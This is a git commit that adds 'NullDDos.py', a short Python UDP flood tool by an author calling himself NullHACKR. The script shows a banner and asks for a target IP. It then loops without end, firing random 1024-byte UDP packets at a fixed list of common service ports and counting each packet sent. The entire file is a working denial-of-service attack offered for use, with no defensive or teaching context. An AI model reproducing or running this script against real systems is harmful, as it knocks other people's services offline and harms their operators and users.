07a841d9bf888d55aaf3a7ff5829667e3b6f79a5
NullH4CK3R <74003988+NullHACKR@users.noreply.github.com>
2020-12-03 12:25:47 +0530

    Add files via upload

---
+++ NullDDos.py
@@ -0,0 +1,71 @@
+#!/usr/bin/python3 
+# NullDDos v 1.0
+# Coded by: NullHACKR
+# Github: https://github.com/NullHACKR/NullDDos
+#
+# import lib
+#
+import socket
+import os
+import sys
+import random
+import time
+#
+# colors
+#
+g = '\033[32m'
+r = '\033[31m'
+y = '\033[93m'
+b = '\033[36m'
+os.system("clear")
+#
+# banner
+#
+print(r+"""
+
+	 /$$   /$$           /$$ /$$ /$$$$$$$  /$$$$$$$                     
+	| $$$ | $$          | $$| $$| $$__  $$| $$__  $$                    
+	| $$$$| $$ /$$   /$$| $$| $$| $$  \ $$| $$  \ $$  /$$$$$$   /$$$$$$$
+	| $$ $$ $$| $$  | $$| $$| $$| $$  | $$| $$  | $$ /$$__  $$ /$$_____/
+	| $$  $$$$| $$  | $$| $$| $$| $$  | $$| $$  | $$| $$  \ $$|  $$$$$$ 
+	| $$\  $$$| $$  | $$| $$| $$| $$  | $$| $$  | $$| $$  | $$ \____  $$
+	| $$ \  $$|  $$$$$$/| $$| $$| $$$$$$$/| $$$$$$$/|  $$$$$$/ /$$$$$$$/
+	|__/  \__/ \______/ |__/|__/|_______/ |_______/  \______/ |_______/ """)
+
+print(g+"""                              NullDDos v 2.0  
+""")
+
+#
+# logo
+#
+print(b+"""  CODED BY : NullHACKR""")
+print(y+"""  GITHUB : NullHACKR""")
+print(r)
+#
+# input
+#
+
+
+ip = input("  TARGET IP : ")
+port = [21, 22, 23, 25, 53, 80, 111,  139, 445, 512, 513, 514, 8080, 4444]
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+byte = random._urandom(1024)
+print(y)
+
+if ip == "":
+      print(r+"Invalid IP")
+else:
+       sent = 0
+       for lport in port:
+            print("[-] Sending packet through all possible port [:)]")
+            print(lport)
+            time.sleep(1)
+       print(r+"[+] Attack Starting.....")
+       time.sleep(5)
+       while True:
+                   for lport in port:
+                        print(b)
+                        s.sendto(byte,(ip,lport))
+                        sent = sent + 1
+                        print(f"sent {sent} packet on ip {ip} through port {lport}")
+
